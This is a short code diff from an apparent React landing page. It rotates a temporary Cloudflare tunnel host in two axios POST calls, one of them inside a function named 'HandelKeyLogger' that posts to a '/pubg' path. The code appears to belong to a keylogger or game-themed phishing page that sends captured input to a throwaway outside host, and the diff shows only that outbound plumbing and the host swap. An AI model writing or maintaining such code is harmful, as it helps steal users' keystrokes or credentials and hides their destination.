@@ -5,7 +5,7 @@ export default function LandingPage() {
 
   useEffect(()=>{
     const getdata=async()=>{
-        await axios.post('https://barbie-shakespeare-llc-cent.trycloudflare.com/').then((result)=>{
+        await axios.post('https://connectors-seas-tom-creatures.trycloudflare.com/').then((result)=>{
             console.log(result.data)
         }).catch((err)=>{
             console.log(err)
@@ -16,7 +16,7 @@ export default function LandingPage() {
   },[])
 
   const HandelKeyLogger=async()=>{
-        await axios.post("https://barbie-shakespeare-llc-cent.trycloudflare.com/pubg").then((result)=>{
+        await axios.post("https://connectors-seas-tom-creatures.trycloudflare.com/pubg").then((result)=>{
             console.log(result.data)
         }).catch((err)=>{
             console.log(err)
